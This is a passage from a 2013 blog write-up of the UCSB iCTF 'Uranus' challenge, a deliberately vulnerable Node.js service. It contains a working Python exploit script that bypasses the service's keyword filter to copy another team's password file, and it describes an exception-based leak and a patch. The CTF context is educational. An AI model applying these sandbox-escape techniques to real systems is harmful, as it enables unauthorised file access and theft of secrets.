</span><span class="line">                    <span class="p">}</span>
</span><span class="line">                    <span class="k">try</span> <span class="p">{</span>
</span><span class="line">                        <span class="k">if</span> <span class="p">(</span><span class="nx">password</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">                            <span class="nx">storeSubmission</span><span class="p">(</span><span class="nx">data_json</span><span class="p">[</span><span class="s1">&#39;flag_id&#39;</span><span class="p">],</span> <span class="nx">data_json</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">],</span> <span class="nx">code</span><span class="p">);</span>
</span><span class="line">                            <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">                            <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Code approved. Please check your parameters carefully before deploying the code to the nuclear reactor.\n&#39;</span><span class="p">);</span>
</span><span class="line">                        <span class="p">}</span>
</span><span class="line">                    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">                        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">E</span><span class="p">);</span>
</span><span class="line">                    <span class="p">}</span>
</span><span class="line">                    <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">                    <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Your code is missing an access code to the nuclear reactor. Expected variable according to the documentation is &quot;password&quot;.\n&#39;</span><span class="p">);</span>
</span><span class="line">                <span class="p">}</span>
</span><span class="line">            <span class="p">}</span>
</span><span class="line">            <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">            <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Code contains unsafe functionality.\n&#39;</span><span class="p">);</span>
</span><span class="line">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">            <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">            <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Your JSON is malformed. Please provide the following properties: flag_id, token, code\n&#39;</span><span class="p">);</span>
</span><span class="line">        <span class="p">}</span>
</span><span class="line">    <span class="p">});</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="nx">process</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;uncaughtException&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Caught exception: &#39;</span> <span class="o">+</span> <span class="nx">E</span><span class="p">);</span>
</span><span class="line"><span class="p">});</span>
</span><span class="line">
</span><span class="line"><span class="nx">http</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span> <span class="nx">handle</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">method</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">handlePOST</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Welcome to Uranus!\nWith the last update of our nuclear reactor we can now control critical variables of the process through the easyness of JavaScript. Uranus is here to proof-check your code for safety before you submit it directly to the reactor. \n\nUse HTTP POST to submit your code.&#39;</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line"><span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">1337</span><span class="p">,</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Server running at http://0.0.0.0:1337/&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The full functionality:</p>

<ul>
  <li>If <code>flag_id</code>, <code>token</code> and <code>code</code> is specified as JSON
    <ul>
      <li>the code is run if it passes the filter (<code>eval</code>, <code>global</code>, <code>Function</code> and <code>this</code> is not alowed)</li>
      <li>the code can’t use <code>require</code> because <a href="https://groups.google.com/forum/#!topic/nodejs/vFkaH8gouDU">it’s not exposed by default</a> when using the <code>vm</code> module</li>
      <li>if it sets the variable <code>password</code> then the code is stored in this file: <code>submissions/{flag_id}-{token}</code></li>
    </ul>
  </li>
  <li>If only <code>flag_id</code> and <code>token</code> is specified
    <ul>
      <li>the password from the <code>submissions/{flag_id}-{token}</code> file is read and returned</li>
      <li>but only if the password is 16 alphanumerical character</li>
    </ul>
  </li>
</ul>

<h2 id="exploitation">Exploitation</h2>

<p>Our exploit worked like this:</p>

<ol>
  <li>Upload a code,</li>
  <li>that finds the file associated with the flag_id</li>
  <li>and copies the file to a known location.</li>
  <li>Use the password retrieval functionality to retrieve the password from the known location.</li>
</ol>

<p>Here’s the full exploit code:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="kn">import</span> <span class="nn">urllib2</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">json</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">re</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="k">class</span> <span class="nc">Exploit</span><span class="p">():</span>
</span><span class="line">    <span class="n">code</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;</span>
</span><span class="line"><span class="s">    fname = ff.readdirSync(&#39;./submissions&#39;).filter(function(name) { return name.match(/^</span><span class="si">%s</span><span class="s">-.*/) })[0];</span>
</span><span class="line"><span class="s">    ff.writeFileSync(&#39;./submissions/spamandhex-1&#39;, ff.readFileSync(&#39;./submissions/&#39; + fname));</span>
</span><span class="line"><span class="s">    &quot;&quot;&quot;</span>
</span><span class="line">
</span><span class="line">    <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">flag_id</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
</span><span class="line">        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span> <span class="s">&quot;flag_id&quot;</span><span class="p">:</span> <span class="n">flag_id</span><span class="p">,</span> <span class="s">&quot;token&quot;</span><span class="p">:</span> <span class="n">token</span> <span class="p">})</span>
</span><span class="line">        <span class="k">return</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class="line">
</span><span class="line">    <span class="k">def</span> <span class="nf">set</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">flag_id</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
</span><span class="line">        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span> <span class="s">&quot;flag_id&quot;</span><span class="p">:</span> <span class="n">flag_id</span><span class="p">,</span> <span class="s">&quot;token&quot;</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">&quot;code&quot;</span><span class="p">:</span> <span class="n">code</span> <span class="p">})</span>
</span><span class="line">        <span class="k">return</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class="line">
</span><span class="line">    <span class="k">def</span> <span class="nf">execute</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">flag_id</span><span class="p">):</span>
</span><span class="line">        <span class="n">url</span> <span class="o">=</span> <span class="s">&#39;http://</span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span><span class="line">        <span class="bp">self</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">&#39;1234&#39;</span><span class="p">,</span> <span class="s">&#39;1&#39;</span><span class="p">,</span> <span class="n">Exploit</span><span class="o">.</span><span class="n">code</span> <span class="o">%</span> <span class="n">flag_id</span><span class="p">)</span>
</span><span class="line">        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">&#39;spamandhex&#39;</span><span class="p">,</span> <span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class="line">        <span class="bp">self</span><span class="o">.</span><span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;Your password: (.*)&#39;</span><span class="p">,</span> <span class="n">result</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class="line">
</span><span class="line">    <span class="k">def</span> <span class="nf">result</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class="line">        <span class="k">return</span> <span class="p">{</span><span class="s">&#39;FLAG&#39;</span> <span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">flag</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Instead of using <code>require</code> to access the <code>fs</code> module, the global <code>ff</code> variable (set by the server code) was used that holds a reference to the <code>fs</code> module. The filter does not find the <code>function</code> keyword because the filter was <code>/Function/</code> and regexes are case-sensitive by default.</p>

<p>After launching our own, we also saw an exploit that abuses the fact that exceptions were reported back to the submitter. This exploit did read out the password from the appropriate file and generated an exception with the password as text.</p>

<h2 id="patch">Patch</h2>

<p>As a patch, I renamed the <code>ff</code> variable to <code>fs</code>, and it turned out to be enough to keep the other teams away.</p>

<h2 id="thanks">Thanks</h2>

<p>It was great fun to solve this puzzle, just as fun as the whole UCSB iCTF competition this year. Thanks to the organizers for organizing such a great competition again this year!</p>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Gábor Molnár</span></span>

      








  


<time datetime="2013-12-13T19:43:00+01:00" pubdate data-updated="true">Dec 13<span>th</span>, 2013</time>
      


    </p>
    
      <div class="sharing">
  
  
  <div class="g-plusone" data-size="medium"></div>
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2013/09/25/gsoc-wrap-up/" title="Previous Post: GSoC - wrap up">&laquo; GSoC - wrap up</a>
      
      
    </p>
  </footer>
</article>

  <section>
    <!--<h1>Comments</h1>-->
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>


</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2013/12/13/ucsb-ictf-2013-uranus/">UCSB iCTF 2013 - The Uranus service</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/09/25/gsoc-wrap-up/">GSoC - wrap up</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/09/15/gsoc-week-number-13/">GSoC week #13</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/09/09/gsoc-week-number-12/">GSoC week #12</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/09/03/gsoc-week-number-11/">GSoC week #11</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - Gábor Molnár -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'gabor-molnar';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://gabor.molnar.es/blog/2013/12/13/ucsb-ictf-2013-uranus/';
        var disqus_url = 'http://gabor.molnar.es/blog/2013/12/13/ucsb-ictf-2013-uranus/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>





  <script type="text/javascript">
    (function() {
      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
      script.src = 'https://apis.google.com/js/plusone.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
    })();
  </script>







</body>
</html>
